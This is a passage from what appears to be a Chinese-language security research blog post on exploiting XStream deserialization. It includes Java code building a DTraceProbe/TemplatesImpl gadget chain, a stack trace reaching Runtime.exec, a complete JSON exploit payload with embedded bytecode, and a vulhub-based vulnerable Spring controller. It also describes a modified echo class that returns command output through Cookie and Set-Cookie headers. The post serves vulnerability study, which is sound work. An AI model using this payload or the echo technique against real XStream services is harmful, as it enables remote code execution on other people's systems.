        private static void setField(String fieldName, Object defineObj, Object value) throws Exception {
            SunUnsafeReflectionProvider reflectionProvider = new SunUnsafeReflectionProvider();
            Field field = reflectionProvider.getFieldOrNull(defineObj.getClass(), fieldName);
            reflectionProvider.writeField(defineObj, fieldName, value, field.getDeclaringClass());
        }
        public static void main(String[] args) throws Exception {
            Object templates = Gadgets.createTemplatesImpl("calc");
            Object dTraceProbe = instaniateUnsafe().allocateInstance(Class.forName("sun.tracing.dtrace.DTraceProbe"));
            Method method_getOutputProperties =  Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl").getDeclaredMethod("getOutputProperties");
            setField("proxy", dTraceProbe, templates);
            setField("implementing_method", dTraceProbe, method_getOutputProperties);
            HashMap map = new HashMap();
            Method method_hashcode =  Class.forName("java.lang.Object").getDeclaredMethod("hashCode");
            map.put(method_hashcode, dTraceProbe);
            Object nullProvider = instaniateUnsafe().allocateInstance(Class.forName("sun.tracing.NullProvider"));
            setField("active", nullProvider, true);
            setField("providerType", nullProvider, Class.forName("java.lang.Object"));
            setField("probes", nullProvider, map);
            InvocationHandler handler = (InvocationHandler) instaniateUnsafe().allocateInstance(Class.forName("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl"));
            Object proxy = Proxy.newProxyInstance(
                    handler.getClass().getClassLoader(),
                    new HashMap().getClass().getInterfaces(),
                    handler);
            Reflections.setFieldValue(handler, "classToInvocationHandler", new LinkedHashMap());
            Reflections.setFieldValue(handler, "defaultHandler", nullProvider);
            LinkedHashSet set = new LinkedHashSet();
            set.add(proxy);
        }
    }
那么如何生成最终的XML
payload，因为在执行到`set.add(proxy)`这行代码时，程序会抛出异常然后不再往下执行，所以如果将`toXml()`函数放在这行代码下面是压根不会执行的。我用的方法比较弱智，就是利用`toXml()`分别输出`proxy`对象和`set`对象的XML形式数据，然后手动拼接一下。
    // set.add(proxy);
    set.add(new Object());  // 这行代码是为了观察在linked-hash-set标签中数据是怎样储存的，然后替换成真实的payload中的proxy对应的XML数据
    XStream xstream = new XStream();
    System.out.println(xStream.toXML(set));
    System.out.println(xStream.toXML(proxy));
正向数据的构造分析完成了，现在就可以大概看一下stack
trace到底是什么样子的，这样方便以后再分析时好理解整个触发过程。从整个的堆栈信息可以看得出来，`hashcode()`确实是关键触发`TemplateImpl`对象的关键函数。
    start:1007, ProcessBuilder (java.lang)
    exec:620, Runtime (java.lang)
    exec:450, Runtime (java.lang)
    exec:347, Runtime (java.lang)
    :-1, Pwner633505606593 (ysoserial)
    newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
    newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
    newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
    newInstance:422, Constructor (java.lang.reflect)
    newInstance:442, Class (java.lang)
    getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:497, Method (java.lang.reflect)
    uncheckedTrigger:58, DTraceProbe (sun.tracing.dtrace)
    triggerProbe:269, ProviderSkeleton (sun.tracing)
    invoke:178, ProviderSkeleton (sun.tracing)
    invoke:82, CompositeInvocationHandlerImpl (com.sun.corba.se.spi.orbutil.proxy)
    hashCode:-1, $Proxy0 (com.sun.proxy)
    hash:338, HashMap (java.util)
    put:611, HashMap (java.util)
    add:219, HashSet (java.util)
    addCurrentElementToCollection:99, CollectionConverter (com.thoughtworks.xstream.converters.collections)
    populateCollection:91, CollectionConverter (com.thoughtworks.xstream.converters.collections)
    populateCollection:85, CollectionConverter (com.thoughtworks.xstream.converters.collections)
    unmarshal:80, CollectionConverter (com.thoughtworks.xstream.converters.collections)
    convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)
    convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)
    convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)
    convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)
    start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)
    unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)
    unmarshal:1409, XStream (com.thoughtworks.xstream)
    unmarshal:1388, XStream (com.thoughtworks.xstream)
    fromXML:1282, XStream (com.thoughtworks.xstream)
    main:15, xstreamTest (Deser)
## JSON反序列化
心细的朋友可以发现几乎所有的XStream的官方通告中都少不了如下的一句话。
    Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.
看了一下XStream的介绍文档，我也没看到除了JSON以外别的supported
format，这里我可能错了，有误请帮忙指出。接下来找一下JSON的序列化和反序列化的代码怎么写，根据伟大的CSDN程序员的总结，我们可以得知：
XStream针对JSON格式的数据的处理有两个driver可以提供支持，分别是`JsonHierarchicalStreamDriver`和`JettisonMappedXmlDriver`。
| Serialization (Java Object -> JSON) | Deserialization (JSON -> Java Object)  
---|---|---  
JsonHierarchicalStreamDriver | √ | ×  
JettisonMappedXmlDriver | √ | √  
所以这里只需要看一下`JettisonMappedXmlDriver`对应的代码怎么写就行。但这里有个小坑，刚开始我用官方的代码和网上的教程都出现`ClassNotFoundException`的报错，这里是因为需要加一下`jettison`的依赖。
        org.codehaus.jettison
        jettison
        1.1
然后就是粗暴地抄一下官方的教程代码。
    XStream xstream = new XStream(new JettisonMappedXmlDriver());
    System.out.println(xstream.toXML(proxy));
    System.out.println(xstream.toXML(set));   // 这里和之前输出XML格式的payload一样，我也是通过手动拼接。
    System.out.println(xstream.fromXML(json));
JSON格式的payload就出来了，执行一下，计算器弹得非常顺畅（`TemplatesImpl`类的`byte-array`第一部分已省略）。
    {"linked-hash-set":{"dynamic-proxy":{"interface":["map","java.lang.Cloneable","java.io.Serializable"],"handler":{"@class":"com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl","classToInvocationHandler":{"@class":"linked-hash-map"},"defaultHandler":{"@class":"sun.tracing.NullProvider","active":true,"providerType":"java.lang.Object","probes":{"entry":{"method":{"class":"java.lang.Object","name":"hashCode","parameter-types":""},"sun.tracing.dtrace.DTraceProbe":{"proxy":{"@class":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","@serialization":"custom","com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl":{"default":{"_name":"Pwnr","_bytecodes":{"byte-array":["yv66vgAA......","yv66vgAAADQAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAQQAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ"]},"_transletIndex":-1,"_indentNumber":0},"boolean":false}},"implementing_method":{"class":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","name":"getOutputProperties","parameter-types":""}}}}}}}}}
## 回显构造
靶机就借p师傅的vulhub中的XStream靶机，把xstream-sample.jar拖出来改一改，加上支持JSON的接口，修改部分的代码如下。
    @RestController
    public class HelloController {
        public HelloController() {
        }
        @GetMapping({"/"})
        public String hello() {
            return "hello, input your information please.";
        }
        @PostMapping({"/xml"})
        public String readxml(@RequestBody String data) {
            XStream xs = new XStream();
            xs.processAnnotations(User.class);
            User user = (User)xs.fromXML(data);
            return "My name is " + user.getName() + ", I am " + user.getAge().toString() + " years old.";
        }
        @PostMapping({"/json"})
        public String readjson(@RequestBody String data) {
            XStream xs = new XStream(new JettisonMappedXmlDriver());
            xs.processAnnotations(User.class);
            User user = (User)xs.fromXML(data);
            return "My name is " + user.getName() + ", I am " + user.getAge().toString() + " years old.";
        }
    }
回显代码改了改fnmsd师傅的回显Java类（膜），然后构造成`TemplatesImpl`对象。主要修改的部分有两个地方，一个是删掉了如下代码，因为这部分代码获取的response对象并不是通过我们发出去request对象来获取的（`request.getResponse()`），所以如果代码走到这个condition当中，会出现把回显的数据写到别的response对象中。
    else if(p == null && hsp.isAssignableFrom(o.getClass())){
        p = o;
    }
第二，为了精确匹配对应的request对象，将输入命令部分从自定义HTTP头字段移入了Cookie字段，这个做法的目的是为了防止在传入数据包的时候经过一些代理设备，这些设备可能会移除一些在它看来无用的HTTP头字段，只留下必要的头字段，已知的一定不会被移除的字段包含了Cookie字段和Host字段，所以写入Cookie应该是最方便的，也是最好读取的。
同时在写入response对象的时候，我修改代码使其可以同时写入body以及Set-Cookie字段，这里不是写入自定义字段的理由和上面说的目的一样。同时写入两个地方也是为了避免一些可能出现的错误和问题。
这里只是简单测试一下回显是否可以成功，我就移除了`java.lang.Runtime`执行代码部分，直接写入unique string证明代码执行无误即可。
## Reference